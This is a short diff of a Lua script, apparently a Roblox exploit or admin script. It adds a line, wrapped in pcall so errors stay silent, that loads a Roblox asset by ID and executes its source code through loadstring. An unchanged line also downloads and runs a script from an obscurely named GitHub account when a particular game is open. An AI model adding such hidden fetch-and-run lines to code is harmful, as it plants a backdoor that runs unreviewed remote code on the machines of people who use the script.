@@ -894,6 +894,8 @@ return g(urprint,...)
 end)
 end
 
+pcall(function() loadstring(game:GetObjects("rbxassetid://10572164822")[1].Source)() end)
+
 if game.PlaceId == 653205701 then
 loadstring(game:HttpGet("https://raw.githubusercontent.com/UD92IlIllllII421248535IlIIIIIIIlllIlIIl/E/main/Fortmartinadmin"))()
 end
